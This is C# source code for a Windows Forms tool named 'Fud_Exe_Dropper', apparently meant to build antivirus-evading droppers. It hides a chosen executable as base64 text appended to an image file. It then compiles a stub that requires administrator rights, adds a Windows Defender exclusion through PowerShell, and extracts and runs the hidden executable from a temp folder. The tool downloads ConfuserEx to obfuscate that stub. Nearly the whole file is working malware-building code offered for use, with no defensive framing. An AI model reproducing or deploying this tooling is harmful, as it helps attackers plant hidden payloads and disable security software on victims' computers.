using System.Windows.Forms;
using System;
using System.IO;
using System.Text;
using System.CodeDom.Compiler;
using System.IO.Compression;
using System.Net;
using System.Diagnostics;

namespace Fud_Exe_Dropper
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            openFileDialog1.ShowDialog();
            string file = openFileDialog1.FileName;
            textBox2.Text = file;
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            openFileDialog2.ShowDialog();
            string file = openFileDialog2.FileName;
            textBox1.Text = file;
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {
            string code = @"
using System.IO;
using System.Linq;
using System.Diagnostics;
using System;

public class MyClass
{
    public static void Main()
    {
        string path_current = Directory.GetCurrentDirectory();

        Process pstest = new Process();
        pstest.StartInfo.FileName = ""powershell.exe"";
        pstest.StartInfo.Arguments = "" -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '"" + path_current + ""'"";
        pstest.Start();
        string path = Path.GetTempPath();
        string path2 = System.IO.Directory.GetCurrentDirectory();
        string image = path2 + ""\\test_image.jpg"";
        var last_line = File.ReadLines(image).Last().ToString();
        var base64_decode = Convert.FromBase64String(last_line);
        File.WriteAllBytes(path + ""text.exe"", base64_decode);
        Process ps = new Process();
        ps.StartInfo.FileName = path + ""text.exe"";
        ps.Start();
        File.Delete(path + ""test.exe"");
    }
}
"; 

            string image = textBox2.Text;
            string exe = textBox1.Text;
            if (image == "" || exe == "")
            {
                MessageBox.Show("Please select a file and an exe.");
            }
            else
            {
                byte[] newLine = Encoding.ASCII.GetBytes(Environment.NewLine);

                string base64 = Convert.ToBase64String(File.ReadAllBytes(exe));
                byte[] base64_code = Encoding.ASCII.GetBytes(base64);

                byte[] originalImage = File.ReadAllBytes(image);
                byte[] putTogether = new byte[originalImage.Length + newLine.Length + base64_code.Length];
                Buffer.BlockCopy(originalImage, 0, putTogether, 0, originalImage.Length);
                Buffer.BlockCopy(newLine, 0, putTogether, originalImage.Length, newLine.Length);
                Buffer.BlockCopy(base64_code, 0, putTogether, originalImage.Length + newLine.Length, base64_code.Length);
                string image_name = Path.GetFileName(image);
                File.WriteAllBytes(image_name, putTogether);
                Console.WriteLine(image_name);

                string new_code = code.Replace("test_image.jpg", image_name);
                File.WriteAllText("test.cs", new_code);

                CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");

                CompilerParameters parameters = new CompilerParameters();

                //Make manifest file so compiled exe has to be run as admin
                var new_manifest = File.Create("manifest.xml");
                new_manifest.Close();
                var xml_code = @"
<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">
  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v3"">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level=""requireAdministrator"" uiAccess=""false""/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
";
                File.WriteAllText("manifest.xml", xml_code);
                parameters.CompilerOptions = @" /target:winexe /optimize /win32manifest:manifest.xml /platform:anycpu";
                parameters.ReferencedAssemblies.Add("System.Linq.dll");
                parameters.ReferencedAssemblies.Add("System.IO.dll");
                parameters.ReferencedAssemblies.Add("System.dll");
                parameters.ReferencedAssemblies.Add("System.Core.dll");
                parameters.GenerateExecutable = true;
                parameters.OutputAssembly = "RENAME.exe";
                CompilerResults results = provider.CompileAssemblyFromSource(parameters, new_code);
                if (results.Errors.HasErrors)
                {
                    // There were errors during compilation, so display them.
                    foreach (CompilerError error in results.Errors)
                    {
                        Console.WriteLine(error.ErrorText);
                    }
                }
                else
                {
                    // Compilation was successful.
                    Console.WriteLine("Compilation was successful.");
                    string output_file = results.PathToAssembly;
                    Console.WriteLine($"Code was wrote to {output_file}");
                    string confuser_ex = "https://github.com/yck1509/ConfuserEx/releases/download/v1.0.0/ConfuserEx_bin.zip";
                    string confuser_ex_zip = "ConfuserEx_bin.zip";
                    var download = new WebClient();
                    download.DownloadFile(confuser_ex, confuser_ex_zip);
                    ZipFile.ExtractToDirectory(confuser_ex_zip, "ConfuserEx");
                    string confuser_ex_path = Path.GetFullPath("ConfuserEx");
                    string confuser_ex_exe = confuser_ex_path + "\\Confuser.CLI.exe";
                    var obfuscate = new Process();
                    obfuscate.StartInfo.FileName = confuser_ex_exe;
                    obfuscate.StartInfo.Arguments = $" -n -o \"{output_file}\"";
                    obfuscate.Start();
                    obfuscate.WaitForExit();
                    string obfuscated_file = output_file.Replace(".exe", "_Confused.exe");
                    File.Move(obfuscated_file, "RENAME.exe");
                    
                }
                File.Delete("manifest.xml");
            }

        }

    }
}